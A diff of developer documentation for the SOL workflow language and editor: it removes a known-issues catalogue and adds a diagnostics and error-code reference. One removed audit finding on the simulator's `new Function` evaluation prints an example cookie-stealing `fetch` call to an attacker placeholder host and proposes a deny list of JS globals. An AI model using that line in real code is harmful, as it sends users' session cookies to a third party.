-**Recommendation:** Defensive SOL programs that call `ext`
-functions should: (1) check return values for default-equivalent
-sentinels when correctness matters; (2) factor any long-running
-or potentially-failing call behind a host-supplied `ext function`
-that the host can wrap in its own timeout/retry policy.
-
-**Related chapter:** [12 §12.4](./12-imports-and-controllers.md), [14 §14.9](./14-runtime-semantics.md)
-
----
-
-### T9014 — Top-level `let` is broken; reading from a function panics at runtime
-
-**Category:** tool — compiler bug (severe; latent because no
-fixture exercises it)
-
-**Description:** A `let` at the top level of a SOL source file
-compiles successfully but does *not* produce a globally-readable
-binding. The mechanics:
-
-1. The analyzer registers the name in the global type table.
-2. The codegen emits `Inst::StoreLocal(0)` (or whatever the next
-   slot happens to be) at the top of the program's main flow.
-   The value is written to `stack[fp + 0]` — and at top-level
-   execution, `fp = 0`, so `stack[0]` gets the value.
-3. Each `DeclFunc` then runs `self.locals.clear()` and
-   `self.next_slot = 0` (`bytecode.rs:401–402`). So inside the
-   function body, the codegen has no record of the top-level
-   binding.
-4. When the function body references the top-level name, the
-   codegen's `find_local_offset` (`bytecode.rs:559–578`) doesn't
-   find it in `locals`, walks `type_tables`, **creates a fresh
-   local at the function's current next_slot** (which starts at
-   `0`), and emits `LoadLocal(0)`.
-5. At runtime, the function's frame pointer `fp` is set to
-   `stack.len() - arg_count` *above* the top-level slot. So
-   `LoadLocal(0)` reads `stack[fp + 0]` — which is past where the
-   top-level value was stored. If the stack is shorter than
-   `fp + 0`, the read **panics** with `index out of bounds`. If
-   the stack happens to have garbage from a prior frame, the
-   read returns garbage.
-
-**Bad example:**
+### VM / runtime (`sol/src/vm.rs`, `value.rs`, `workflow.rs`)
+
+The VM evaluates bytecode. A failing step returns
+`StepResult::Failed(String)` (or an internal `Err(String)`); both carry one
+of these messages. Because there is no type checker, every type error lands
+here. Representative messages:
+
+| Message | Triggered by |
+| --- | --- |
+| `division by zero` | integer or float divide / modulo by `0` |
+| `variable '{name}' not found` | reading a name with no binding in scope |
+| `field '{f}' not found` | reading a struct field that does not exist |
+| `cannot access field '{f}' on {value}` | member access on a non struct value |
+| `cannot assign to field of non-struct` | `x.f = v` where `x` is not a struct |
+| `index {N} out of bounds` | array index past the end |
+| `cannot index {value} with {value}` | indexing a non array, or with a non int |
+| `cannot use {value} as condition` | an `if` / `while` condition that is not `bool` or `int` |
+| `function '{name}' not found` | calling a builtin or function name that does not exist |
+| `cannot {op} {value} and {value}` | arithmetic / comparison on incompatible operand types |
+| `cannot negate {value}` / `cannot apply 'not' to {value}` | unary `-` or `!` on an unsupported type |
+| `len() takes exactly 1 argument` etc. | builtin arity violations (`len`, `to_str`, `type_name`) |
+| `workflow '{name}' not found` | `WorkflowExecutor::new` with a name no workflow declares |
+
+Example that fails at run time with `division by zero`:
 
 ```sol
-let g: int = 42;
-fn start() -> int {
-    return g;
+workflow "demo" {
+    let a: int = 10;
+    let b: int = 0;
+    print(a / b);   # runtime Failed("division by zero")
 }
 ```
 
-**What actually happens:**
-
-- Top-level emits `PushConst(42); StoreLocal(0)` → `stack = [42]`,
-  `fp = 0`.
-- `Jump` past the function body to the appended `Call(start_addr, 0)`.
-- `Call`: pushes a frame, sets `fp = stack.len() - 0 = 1`.
-- Body runs `LoadLocal(0)` → reads `stack[fp + 0] = stack[1]`.
-- `stack.len() == 1` → **index out of bounds → runtime panic.**
-
-**Where it lives:** `bytecode.rs:401–402` (per-function reset of
-locals/next_slot), `bytecode.rs:559–578` (`find_local_offset`
-auto-creates a fresh slot), `vm.rs:118–122` (`LoadLocal` does an
-unchecked stack index).
-
-**Recommendation:** **Don't use top-level `let` in production
-SOL.** Move every binding inside a function. A future fix would
-have the codegen recognize global-scope symbols at the type-table
-level and either emit them as well-known fixed-offset globals or
-desugar reads of them into a separate `LoadGlobal` op.
-
-**Latency:** No fixture in the corpus exercises this — every
-fixture wraps state inside a function. The bug is latent in
-practice, but anyone porting an idiom from another language ("just
-declare a global constant at the top of the file") will hit it
-immediately.
-
-**Severity:** Severe. This is not silent corruption — it is
-either an immediate panic (best case) or a silent read of
-unrelated stack data (worst case).
-
-**Related chapters:** [03 §3.3](./03-syntax.md), [06 §6.1](./06-variables-and-scope.md), [20 §20.2](./20-implementation-notes.md)
-
----
-
-### T9015 — Local function call's `fn_returns` race for forward calls
-
-**Category:** tool — analyzer/codegen gap
-
-**Description:** The `Codegen.fn_returns` map is populated for
-struct and `ext function` declarations in pass 1
-(`bytecode.rs:124–139`), and for *regular* function declarations
-in pass 2 *at the moment the function is emitted*
-(`bytecode.rs:399`). Built-in RPC return types are also pre-
-registered (`bytecode.rs:117–121`).
-
-The issue: if a call site emits *before* its target function is
-emitted (forward call), the codegen's `fn_returns.get(name)`
-returns `None`. The `infer_type` helper used by `display_type`
-(`bytecode.rs:627–629`) then falls back to `Type::Integer`:
-
-```rust
-Ast::ExprFuncCall { name, .. } => {
-    self.fn_returns.get(name).cloned().unwrap_or(Type::Integer)
-}
-```
-
-Practical impact: `print(forward_call())` where `forward_call`
-returns `str` will dispatch via `Inst::PrintInt`, printing the
-string's heap index as a decimal number rather than its contents.
-
-**Bad example:**
+Example that fails at run time with `variable 'x' not found` (no compile
+time check catches this):
 
 ```sol
-fn start() -> int {
-    print(get_name());     # forward call; get_name not yet emitted
-    return 0;
-}
-
-fn get_name() -> str {
-    return "hello";
+workflow "demo" {
+    print(x);   # x was never declared
 }
 ```
 
-**Diagnostic:** none — silent wrong-output bug.
-
-**Recommendation:** Pre-populate `fn_returns` with every regular
-function's return type in pass 1, the same way `DeclExtFunc`
-already does. Until then, declare a function *before* its first
-call site, or accept that `print` of a forward call's result
-prints garbage for non-int return types.
-
-**Where it lives:** `bytecode.rs:117–121, 124–139, 423–432,
-627–629`.
-
-**Latency:** Trips immediately if anyone writes `print(name())`
-where `name`'s return type isn't `int` and `name` is declared
-later in source. No fixture in the corpus exercises this pattern.
-
-**Related chapters:** [13 §13.1](./13-builtins-and-stdlib.md), [20 §20.6](./20-implementation-notes.md)
+The full builtin set is `print`, `len`, `to_str`, and `type_name`. Calling
+anything else by bare name yields `function '{name}' not found`. External
+Actions are not builtins; they are reached via `call("m.f", p)`, an
+imported `m.f(args)`, or `m::rpc(args)`, each of which becomes a remote
+call rather than an error (see section 2.4).
 
 ---
 
-### T9016 — Built-in RPC names shadow user `ext function` declarations
+## 2. Bridge diagnostics (`compiler-wasm/src/lib.rs`)
 
-**Category:** tool — language minor
+The editor calls the wasm bridge (`parse_source_json`, `compile_source_json`,
+`run_source_json`, and friends). Each returns a JSON `Envelope` and, for
+runs, a `run` object. Inside that envelope, every error the bridge raises is
+one of exactly **five** codes. There are no E0xxx, E1xxx, E2xxx, or T90xx
+codes anywhere in the live pipeline.
 
-**Description:** The call-site dispatch (`bytecode.rs:423–481`)
-matches the function name against the built-in names *before*
-checking the `ext_functions` set. So if a user declares
-`ext fn rpc_request(payload: str) -> str;` and the host
-endpoint table provides a URL for `rpc_request`, the user's
-declaration is silently ignored — every call to `rpc_request`
-is emitted as the built-in `SerializeRequest` op, not as
-`ExtCall`.
+### 2.1 The complete code vocabulary
 
-**Recommendation:** Don't reuse any of `print`, `rpc_request`,
-`rpc_response`, `rpc_name`, `rpc_args`, `rpc_data` as an `ext
-function` name. The compiler does not warn about the shadow.
+| Severity | Phase | Code | When it fires | Tiny trigger |
+| --- | --- | --- | --- | --- |
+| Error | Parser | `E_PARSE` | the parser returned an `Err` | `fn f( {` (malformed) |
+| Error | Codegen | `E_CODEGEN` | the compiler returned an `Err` | `workflow "w" { let xs: []int = [1]; xs[0] = 2; }` (`index assignment not supported`) |
+| Error | Analyzer | `E_NO_WORKFLOW` | a run was requested but the program declares no workflow | a source file with only `fn` / `struct` and no `workflow "..."` |
+| Warning | Runtime | `E_RUNTIME` | a `run` produced `StepResult::Failed` (or an internal step error) | `workflow "w" { print(1 / 0); }` |
+| Error | Internal | `ICE0001` | the bridge caught a panic while invoking the crate | an internal compiler panic (should not happen in practice) |
 
-**Where it lives:** `bytecode.rs:423–453` (built-in dispatch
-checked first), `bytecode.rs:454–466` (`ext_functions` check
-checked second).
+Notes on each:
 
-**Related chapter:** [13](./13-builtins-and-stdlib.md), [12 §12.1](./12-imports-and-controllers.md)
+- **`E_PARSE`** carries the parser's raw message (section 1, Parser).
+  Emitted by `parse_source_json`, `compile_source_json`,
+  `format_source_json`, `compile_for_wire_json`, and the parse step of
+  `run_source_json`.
+- **`E_CODEGEN`** carries the compiler's raw message (section 1, Compiler).
+  Emitted by `compile_source_json`, `compile_for_wire_json`, and the
+  compile step of `run_source_json`. Note `format_source_json` only parses,
+  so it reports `E_PARSE` and never `E_CODEGEN`.
+- **`E_NO_WORKFLOW`** is unique to `run_source_json`: parse and compile
+  succeeded but there is no workflow to execute. Its message is
+  `no workflow declaration found`. The phase string is `Analyzer` even
+  though there is no analyzer pass; it is just the bridge's label for this
+  pre run check.
+- **`E_RUNTIME`** is a **Warning**, not an Error, so the run envelope's
+  `ok` stays `true` (compilation succeeded; the failure was at run time).
+  Its message is the VM's raw string (section 1, VM).
+- **`ICE0001`** is an Internal Compiler Error. The bridge wraps every entry
+  point in `catch_unwind`; if the crate panics, the bridge returns an
+  `ICE0001` envelope with the panic text rather than crashing the wasm
+  module.
+
+### 2.2 The diagnostic JSON shape
+
+This is the stable editor contract, mirrored in
+[`src/compiler/types.ts`](../../src/compiler/types.ts) as `SolDiagnostic`:
+
+```jsonc
+{
+  "severity": "Error",       // "Error" | "Warning" | "Note"
+  "phase": "Parser",         // "Lexer" | "Parser" | "Analyzer" | "Codegen" | "Runtime" | "Internal"
+  "code": "E_PARSE",         // one of the five codes above
+  "message": "expected RBrace, got EOF",
+  "span": null,              // SourceSpan or null; null in practice today
+  "related": [],             // RelatedSpan[]; empty today
+  "help": null               // string or null; null today
+}
+```
+
+The `phase` enum reserves `Lexer`, but the lexer never hard errors, so
+`Lexer` is **never emitted**. The `span`, `related`, and `help` fields exist
+in the contract for forward compatibility but are null / empty today,
+because the crate carries no span information.
+
+The envelope that wraps the diagnostics:
+
+```jsonc
+{
+  "ok": true,                // false iff a fatal Error short-circuited
+  "value": { /* per entry point */ },
+  "diagnostics": [ /* SolDiagnostic[] */ ]
+}
+```
+
+`run_source_json` adds a `run` object alongside `ok`, `value`, and
+`diagnostics`:
+
+```jsonc
+{
+  "ok": true,
+  "value": { "instruction_count": 12 },
+  "diagnostics": [ /* may contain an E_RUNTIME warning */ ],
+  "run": {
+    "return_value": 42,        // number | null
+    "output": ["line one"],    // captured print() lines
+    "steps": 7,
+    "runtime_error": null,     // RuntimeError | null (section 2.4)
+    "runtime_error_source_span": null,
+    "trace": [],
+    "trace_truncated": false
+  }
+}
+```
+
+### 2.3 Where each code can appear, by entry point
+
+| Entry point | Possible error codes |
+| --- | --- |
+| `parse_source_json` | `E_PARSE`, `ICE0001` |
+| `analyze_source_json` | `E_PARSE`, `ICE0001` |
+| `compile_source_json` | `E_PARSE`, `E_CODEGEN`, `ICE0001` |
+| `compile_for_wire_json` | `E_PARSE`, `E_CODEGEN`, `ICE0001` |
+| `format_source_json` | `E_PARSE`, `ICE0001` |
+| `run_source_json` | `E_PARSE`, `E_CODEGEN`, `E_NO_WORKFLOW`, `E_RUNTIME`, `ICE0001` |
+
+### 2.4 Runtime error views
+
+When a run does not complete cleanly, `run.runtime_error` holds a structured
+value (a discriminated union tagged by `kind`), separate from the
+`E_RUNTIME` text diagnostic. There are two relevant unions:
+
+- The **browser sim** (`RtErr` in `compiler-wasm/src/lib.rs`) emits only:
+  - `ExtCallBlocked { function_name, url }`: the workflow tried to make an
+    external Action call; the sim blocks it and reports the capability name.
+  - `StepLimit { limit }`: the run exceeded the bridge's step guard.
+- The wider **`RuntimeErrorView`** union (shared with the controller in
+  [`src/runtime-host/types.ts`](../../src/runtime-host/types.ts), mirrored as
+  `RuntimeError` in `src/compiler/types.ts`) is the wire shape that exists so
+  editor code can `switch` on `kind` exhaustively. Most of its variants are
+  **wire only**: they are defined for the controller's real runtime but are
+  not produced by the in browser sim.
+
+| `kind` | Emitted by sim? | Meaning |
+| --- | --- | --- |
+| `ExtCallBlocked` | yes | external Action call blocked in the sim |
+| `StepLimit` | yes | step guard exceeded in the sim |
+| `DivByZero` | wire only | divide by zero (sim surfaces this as `E_RUNTIME` text instead) |
+| `IndexOutOfBounds` | wire only | array index past the end |
+| `StackUnderflow` | wire only | VM stack underflow |
+| `ExtCallFailed` | wire only | a connector call failed on the controller |
+| `HeapShapeMismatch` | wire only | heap value shape did not match expectations |
+| `Cancelled` | wire only | run was cancelled |
+| `Timeout` | wire only | wall clock budget exhausted |
+| `ResourceLimit` | wire only | a per run resource cap was exceeded |
+
+In other words: in the browser, expect only `ExtCallBlocked` and
+`StepLimit` in `runtime_error`; arithmetic and indexing failures show up as
+`E_RUNTIME` warning text. The rest of the union is reserved for the
+controller side runtime.
 
 ---
 
-### T9018 — Validator does not lint inline expression syntax
+## 3. Editor structural validation (`src/graph/validate.ts`)
 
-**Category:** tool — editor/SOL semantic gap
+This layer is **not the compiler**. It runs structural checks on the visual
+graph before SOL is even emitted, and it uses kebab-case codes (distinct
+from the bridge's five codes). It catches mistakes that would otherwise
+produce broken SOL or surprising runtime behavior.
 
-**Description:** The editor's validator
-(`src/graph/validate.ts:82–96`) treats a non-empty
-`node.expressions[portId]` string as satisfying a required input
-port. It does **not** parse, type-check, or otherwise validate
-the string's content. The emitter inserts the string verbatim
-into the generated SOL.
+| Code | Severity | Meaning |
+| --- | --- | --- |
+| `no-entry` | warning | no `start` function and no trigger node, so the workflow has no entry point |
+| `unnamed-function` | error | a function has an empty name; emission would produce SOL the parser rejects |
+| `enum-first-char-collision` | warning | two enum variants share a first character (see note below) |
+| `missing-input` | error | a required input port has neither a wired edge nor a non empty inline expression |
+| `bad-inline-expression` | error | an inline expression failed the lint (`lintInlineExpression`); unsafe to emit or to evaluate in the sim |
+| `unset-struct` | error | a struct literal / field access / field set node has no struct selected |
+| `unknown-struct` | error | the selected struct name is not defined in the workflow |
+| `unset-field` | error | a field access / field set node has no field selected |
+| `unset-enum` | error | an enum variant node has no enum selected |
+| `unknown-enum` | error | the selected enum name is not defined in the workflow |
+| `unset-variant` | error | an enum variant node has no variant selected |
+| `unset-call` | error | a call node has no target function selected |
+| `unknown-call` | error | the call node's target function is not found |
+| `unset-var` | error / warning | an assign node has no target variable (error), or a varGet node has none selected (warning) |
+| `unresolved-var` | warning | a varGet references a variable not declared in its function |
+| `type-mismatch` | warning | a data edge connects ports whose types are not equal |
 
-A `let` node with `expressions['value'] = "if true { 1 } else { 2 }"`
-passes validation. The emitter produces:
+`missing-input` and `bad-inline-expression` are the two codes the Sol Man
+store treats as never bypassable via `force=true`.
+
+### Note: `enum-first-char-collision` (the historical `T9002` hazard)
+
+The canonical bytecode dispatches each enum variant by
+`(first_char as i128) % 10`. Two variants whose first characters share a
+mod-10 residue therefore compare **equal at run time**, even though the by
+name simulator runs them correctly, so the bug is invisible during in
+browser testing. The editor surfaces it as a warning so the user is not
+ambushed at deploy time. For example, in:
 
 ```sol
-let x: int = if true { 1 } else { 2 };
+enum Status { Active; Aborted; }
 ```
 
-SOL has no `if`-expression form; the parser fails at
-`primary()` with `not an expressionable token: If` →
-`could not parse expression!`.
-
-**Where it lives:** `src/graph/validate.ts:82–96`,
-`src/emit/emit.ts:emitDataInput`.
-
-**Recommendation:** At minimum, reject inline expressions
-containing the keywords `if`, `else`, `while`, `for`, `let`,
-`return`, `struct`, `enum`, `import`, `function`, `ext`, `as`,
-`true`, `false` (where the last two are only valid as literal
-expressions, not embedded in arbitrary text). A stronger fix
-would route inline expressions through a real SOL expression
-parser before emitting.
-
-**Related chapter:** [18 §18.7](./18-solflow-mapping.md), [19 §19.8.6](./19-solman-generation-guide.md)
+both `Active` and `Aborted` start with `A` (`'A' % 10 == 5`) and collide at
+run time. The fix is to rename one so every variant has a distinct first
+character. This is the only place the old `T9002` concept survives, and it
+now lives in the editor, not the compiler.
 
 ---
 
-### T9019 — Editor's `any` type leaks into SOL as nominal struct ref
-
-**Category:** tool — editor/SOL type gap
-
-**Description:** The editor uses `{ kind: 'any' }` as a SolType
-for unresolved data ports. `typeLabel` emits this as the literal
-`"any"`. When emitted in a type position (e.g. `let x: any =
-…;`), the canonical parser treats `any` as
-`Type::Ident("any")` — a nominal struct reference. The
-analyzer doesn't check struct existence at the decl site (T9009),
-so the program compiles, but any field access on `x` later fails
-with `could not find struct \`any\` in scope`.
-
-**Where it lives:** `src/graph/schema.ts:typeLabel`,
-`src/emit/emit.ts:emitStatement` (`let` case).
-
-**Recommendation:** When emitting a type that contains `kind:
-'any'`, the emitter should produce a comment + a TODO marker
-rather than the literal `any`, or — better — refuse to emit and
-treat as a validation error.
-
-**Related chapter:** [18 §18.7](./18-solflow-mapping.md)
-
----
-
-### T9020 — Apply-anyway produces `/* missing */` placeholders that parse-fail or silent-no-op
-
-**Category:** tool — editor/SOL emission gap
-
-**Description:** When the user clicks "Apply draft with errors"
-in the Sol Man modal (chapter 19), the validator's errors are
-bypassed but the emitter still runs. For each missing required
-input, the emitter inserts the literal string `/* missing */`
-(`src/emit/emit.ts:324`).
-
-`/* missing */` is a SOL block comment that the lexer consumes as
-trivia. Three failure modes result:
-
-1. `let x: int = /* missing */;` → `let x: int = ;` → parse
-   error E0001.
-2. `if /* missing */ { … }` → `if { … }` → parse error
-   (`expression()` sees `{`).
-3. `print(/* missing */);` → `print();` → the bytecode emitter's
-   `&& !args.is_empty()` guard at `bytecode.rs:424` skips the
-   Print op entirely. The call has no observable effect — the
-   worst kind of silent no-op.
-
-**Where it lives:** `src/emit/emit.ts:324` (`/* missing */`
-fallback); `bytecode.rs:424` (the empty-args guard).
-
-**Recommendation:** The emitter should either refuse to emit
-when a required port is unsatisfied (preserving the validation
-error) or insert a more obviously-invalid placeholder like
-`__UNRESOLVED_INPUT__` that the parser will reject in any
-context.
-
-**Related chapter:** [18 §18.7](./18-solflow-mapping.md), [19 §19.8.11](./19-solman-generation-guide.md)
-
----
-
-### T9021 — Literal node value text is unchecked against `litType`
-
-**Category:** tool — editor/SOL emission gap
-
-**Description:** The editor's `literal` node stores a free-form
-`value: string` and a `litType: SolPrimitive`. The formatter
-(`src/emit/emit.ts:formatLiteral`) does light type-aware
-formatting (`0` for empty int, `0.0` for empty float, string
-escape) but never validates the value text against the type.
-
-Examples that emit parser-invalid or behavior-bug SOL:
-
-| `litType` | User typed | Emitted | Compiler verdict |
-|---|---|---|---|
-| `int` | `0xFF` | `0xFF` | Lexer tokenizes `0` then `xFF` separately; parse error in expression context |
-| `int` | `hello` | `hello` | Becomes an identifier reference; analyzer rejects with E1001 |
-| `int` | `3.14` | `3.14` | Lexer produces a float; expression context decides |
-| `bool` | `yes` | `false` | Silently coerced — formatter returns `"false"` for anything ≠ `"true"` |
-| `char` | `` (empty) | `' '` | Becomes a single-space char; unintended but compiles |
-| `float` | `1` | `1.0` | Auto-formatter adds `.0` (intentional convenience) |
-
-**Where it lives:** `src/emit/emit.ts:formatLiteral`.
-
-**Recommendation:** Validate the value text against the type at
-edit time. For `int`, accept only `-?[0-9]+`. For `float`,
-accept only the SOL float regex (digits-dot-digits). For
-`bool`, restrict to exactly `true` or `false`. For `char`,
-require exactly one character.
-
-**Related chapter:** [18 §18.7](./18-solflow-mapping.md)
-
----
-
-### T9022 — Simulator evaluates inline expressions as JavaScript
-
-**Category:** tool — simulator/canonical divergence
-
-**Description:** `src/runtime/interpret.ts:evalInline` translates
-SOL inline expressions to JavaScript with one substitution
-(`E::V` → `"E::V"`), then runs them via
-`new Function(...names, "return (${jsExpr});")`. All other
-expression syntax is interpreted as JavaScript.
-
-Programs that depend on JS-specific syntax (`payload.amount.toFixed(2)`,
-`arr.length`, `typeof x`, `Math.floor(...)`, etc.) run cleanly
-in the simulator and fail at canonical SOL parse or analyze
-time.
-
-**Where it lives:** `src/runtime/interpret.ts:690–709`.
-
-**Recommendation:** Replace `new Function` with a real SOL
-expression evaluator. Until then, treat the simulator as a
-"JavaScript-flavored approximation".
-
-**Related chapter:** [23 §23.2](./23-editor-runtime-audit.md)
-
----
-
-### T9023 — Simulator's `+` does string concatenation
-
-**Category:** tool — simulator/canonical divergence
-
-**Description:** The simulator's `applyBinaryOp` for `+` uses
-`numOrConcat`, which concatenates if either operand is a string
-(`src/runtime/interpret.ts:621, 656–661`). So `"hello" + name`
-returns a concatenated string in the simulator.
-
-Canonical SOL: analyzer rejects `str + str` with E1006 (T9005).
-Workflow runs in simulator, fails at compile.
-
-**Related chapter:** [23 §23.3](./23-editor-runtime-audit.md), [04 §4.2.4](./04-types.md)
-
----
-
-### T9024 — Simulator's `/` always does float division
-
-**Category:** tool — simulator/canonical divergence
-
-**Description:** `case '/': return num(a) / num(b)` — JavaScript
-division always returns a double. `5 / 2` returns `2.5` in the
-simulator. Canonical SOL: `IntDiv` does truncating i64 division
-(`5 / 2 = 2`).
-
-**Where it lives:** `src/runtime/interpret.ts:624–628`.
-
-**Recommendation:** When both operands are integers (their inferred
-type matches the SOL `int` type), use `Math.trunc(num(a) / num(b))`.
-
-**Related chapter:** [23 §23.3](./23-editor-runtime-audit.md), [04 §4.2.1](./04-types.md)
-
----
-
-### T9025 — Simulator's `toBool` accepts non-bool
-
-**Category:** tool — simulator/canonical divergence
-
-**Description:** `toBool(v)` accepts JS booleans, numbers,
-strings, and any other truthy/falsy value
-(`src/runtime/interpret.ts:674–679`). Canonical SOL requires
-`bool` for `if`/`while`/`for-in` conditions and for `&&`/`||`
-operands; E1003 / E1009 reject non-bool.
-
-`if score { ... }` (where score is `int`) runs in the simulator
-and fails to compile.
-
-**Related chapter:** [23 §23.3](./23-editor-runtime-audit.md), [04 §4.2.3](./04-types.md), [08 §8.3](./08-expressions.md)
-
----
-
-### T9026 — Simulator enum comparison normalizes by name (hides T9002)
-
-**Category:** tool — simulator/canonical divergence
-
-**Description:** The simulator represents enum variants as strings
-(`"E::V"` or `"E::V(N)"`) and compares them after stripping the
-optional `(N)` suffix (`src/runtime/interpret.ts:663–672`).
-Comparison is by enum + variant name — the *intended* semantics.
-
-Canonical SOL bytecode uses `first_char % 10` for runtime values
-(T9002). Two variants with the same first character collide at
-runtime in production but never in the simulator.
-
-This is the **single most important simulator/canonical
-divergence**: the simulator masks a real production bug. Users
-test their workflow, see correct enum dispatch, deploy, and
-silently misbehave.
-
-**Where it lives:** `src/runtime/interpret.ts:562–567, 663–672`.
-
-**Recommendation:** Until T9002 is fixed in the canonical
-bytecode, the simulator should mirror the buggy behavior — or
-emit a warning whenever two variants in an enum share a first
-character (telling the user "this works here but will collide in
-production").
-
-**Related chapter:** [23 §23.3](./23-editor-runtime-audit.md), [10 §10.5](./10-enums.md), [21 §21.6](./21-behavior-classification.md)
-
----
-
-### T9027 — Simulator has flat per-function scope (no block scoping)
-
-**Category:** tool — simulator/canonical divergence
-
-**Description:** The simulator uses a single
-`Record<string, unknown>` per function call as the scope
-(`src/runtime/interpret.ts:74, 179`). Every `let` inside the
-function body writes to the same flat object. Two `let`s with the
-same name in different blocks overwrite each other.
-
-Canonical SOL: block-scoped. Same-block duplicates fail E1002;
-different-block declarations are independent.
-
-Two opposite-direction bugs result:
-
-1. `let x: int = 5; if true { let x: int = 10; } return x;` —
-   simulator returns `10`; canonical SOL fails E1002.
-2. `if true { let inner: int = 5; } return inner;` —
-   simulator returns `5`; canonical SOL fails E1001.
-
-**Where it lives:** `src/runtime/interpret.ts:74, 179–224`.
-
-**Recommendation:** Add a scope-stack to the simulator that
-mirrors the analyzer's block-scoping model. Push on Block entry,
-pop on Block exit.
-
-**Related chapter:** [23 §23.4](./23-editor-runtime-audit.md), [06 §6.3, 06 §6.4](./06-variables-and-scope.md)
-
----
-
-### T9028 — Simulator throws on undefined variable (catches what T9014 hides)
-
-**Category:** tool — simulator/canonical divergence
-
-**Description:** The simulator's `evalNode` for `varGet` throws
-`RuntimeError('undefined variable: <name>')` when the name isn't
-in scope (`src/runtime/interpret.ts:520–522`).
-
-Canonical bytecode auto-creates a slot with `Type::Integer`
-default and emits `LoadLocal(slot)`, producing undefined behavior
-at runtime (T9014). The simulator is *stricter* — it catches the
-bug at simulation time that the canonical compiler papers over.
-
-Direction of divergence: **simulator > canonical** for safety
-here. Programs that pass simulation are safer with respect to
-this category, but programs that fail simulation aren't
-necessarily wrong in canonical SOL — they may "work" via T9014's
-mechanism.
-
-**Recommendation:** Keep the simulator's behavior; fix the
-canonical side to match (T9014's recommendation).
-
-**Related chapter:** [23 §23.4](./23-editor-runtime-audit.md), [06 §6.1](./06-variables-and-scope.md)
-
----
-
-### T9029 — Simulator's `new Function` is arbitrary JS execution
-
-**Category:** tool — security hazard
-
-**Description:** The simulator constructs and executes a JS
-function from the inline expression string. A workflow loaded
-from an untrusted source (shared `.workflow.json`, Sol Man LLM
-output with prompt-injected expression) can execute arbitrary
-JavaScript in the user's browser the moment "Run" is clicked.
-
-Example malicious inline expression:
-
-```text
-fetch('https://attacker.example/' + document.cookie)
-```
-
-The simulator does not sandbox, does not block globals, does not
-restrict network access. Cookies, localStorage, fetched data —
-all reachable.
-
-**Where it lives:** `src/runtime/interpret.ts:702–703`.
-
-**Severity:** **High** for workflows loaded from untrusted
-sources. Low for hand-authored workflows.
-
-**Recommendation:**
-
-1. **Short term:** disallow specific JS globals/syntax in inline
-   expressions at validation time (`Math`, `Date`, `document`,
-   `window`, `globalThis`, `fetch`, `eval`, method-call chains,
-   `typeof`).
-2. **Medium term:** sandbox the `new Function` evaluation in a
-   Web Worker with `globalThis` shadowed.
-3. **Long term:** replace `new Function` with a real SOL
-   expression evaluator (T9022 fix).
-
-**Related chapter:** [23 §23.8](./23-editor-runtime-audit.md)
-
----
-
-### T9030 — Simulator step/depth/duration limits do not exist in canonical SOL
-
-**Category:** tool — simulator/canonical divergence
-
-**Description:** The simulator throws `RuntimeError` when any of
-MAX_STEPS (100_000), MAX_CALL_DEPTH (1000), or MAX_DURATION_MS
-(60_000) is exceeded (`src/runtime/interpret.ts:70–72, 296–304`).
-Canonical SOL has none of these limits.
-
-Programs that fail simulator limits may run fine in production.
-A recursive function with depth 1500 simulates as "Maximum call
-depth exceeded" but runs in canonical SOL until the host's Rust
-stack overflows.
-
-The simulator's limits are defensive (against tab-freezing), not
-semantic.
-
-**Recommendation:** Document the limits as simulator-only.
-Future canonical SOL may add semantic limits; until then, treat
-"simulator OOM/timeout" as a UX signal rather than a correctness
-signal.
-
-**Related chapter:** [23 §23.7](./23-editor-runtime-audit.md)
-
----
-
-### T9031 — Simulator cannot exercise `ext function` calls
-
-**Category:** tool — feature gap
-
-**Description:** The simulator's `call` op looks up the target
-in `ctx.workflow.functions`. The editor's schema doesn't model
-`ext function` declarations at all (they're a runtime concept).
-A workflow that calls an external function fails at simulation
-with `target function not found`.
-
-Users cannot end-to-end test workflows that depend on `ext` calls
-via the simulator. The only way to verify ext-heavy workflows is
-to run them in a real host with the endpoint configured.
-
-**Where it lives:** `src/runtime/interpret.ts:459–476`.
-
-**Recommendation:** Add a simulator-side "ext stub" mechanism:
-let the user define mock return values for each `ext` name. The
-simulator dispatches to the mock; the host dispatches to the
-real endpoint.
-
-**Related chapter:** [23 §23.6](./23-editor-runtime-audit.md), [12 §12.1](./12-imports-and-controllers.md)
-
----
-
-### T9032 — `updateFunctionSignature` leaves dangling arg edges
-
-**Category:** tool — graph mutation hazard
-
-**Description:** When a function's signature changes (parameter
-renamed), the store rebuilds the ports on every call-node
-(`src/stores/graph.store.ts:152–170`) but does **not** call
-`rebuildAllPorts()`. Edges pointing at the old `arg:<old-name>`
-ports become dangling — the new ports use `arg:<new-name>` ids.
-
-Symptom: validator fires `missing input arg:<new-name>` on every
-call-node after the rename; the dangling edge remains in the
-graph silently. The user must re-wire or manually delete.
-
-**Where it lives:** `src/stores/graph.store.ts:152–170`.
-
-**Recommendation:** Call `rebuildAllPorts()` after every signature
-change to clean up dangling edges proactively.
-
-**Related chapter:** [23 §23.9](./23-editor-runtime-audit.md)
-
----
-
-### T9033 — `rebuildAllPorts` silently drops dangling edges
-
-**Category:** tool — silent data loss
-
-**Description:** `src/stores/graph.store.ts:856–865` filters out
-every edge whose endpoint port no longer exists, with no user
-warning. After a struct field rename or a function-signature
-change, edges that referenced the old port ids are removed
-silently. The user loses wiring they may have spent time
-creating.
-
-**Where it lives:** `src/stores/graph.store.ts:851–867`.
-
-**Recommendation:** Collect the dropped edges and surface them as
-warnings (toast / Inspector panel). Or refuse to rebuild ports
-when edges would be dropped, prompting the user to confirm.
-
-**Related chapter:** [23 §23.9](./23-editor-runtime-audit.md)
-
----
-
-### T9034 — `loadWorkflow` performs no schema validation
-
-**Category:** tool — defense gap
-
-**Description:** `src/stores/graph.store.ts:834–839`:
-```ts
-function loadWorkflow(wf: SolWorkflow) {
-    workflow.value = wf;
-    activeFunctionId.value = wf.functions[0]?.id ?? '';
-    rebuildAllPorts();
-    touch();
-}
-```
-
-The TypeScript signature claims `SolWorkflow` but the function
-performs no runtime validation. A malformed object (missing
-`imports`, `meta`, or with wrong-shaped nodes) is accepted; the
-store enters an inconsistent state; downstream `validateWorkflow`
-/ `emit` / Inspector / canvas may crash.
-
-`bootstrap()` (autosave-resume) does check
-`parsed.schemaVersion === 1 && parsed.functions?.length`;
-`loadWorkflow` skips even that.
-
-**Where it lives:** `src/stores/graph.store.ts:834–839`.
-
-**Recommendation:** Route every `loadWorkflow` call through a
-validator that asserts the schema shape. Reject malformed
-workflows at the boundary.
-
-**Related chapter:** [23 §23.9](./23-editor-runtime-audit.md)
-
----
-
-### T9035 — Undo/redo `isReplaying` race window
-
-**Category:** tool — rare race condition
-
-**Description:** The store's undo/redo flow uses a single
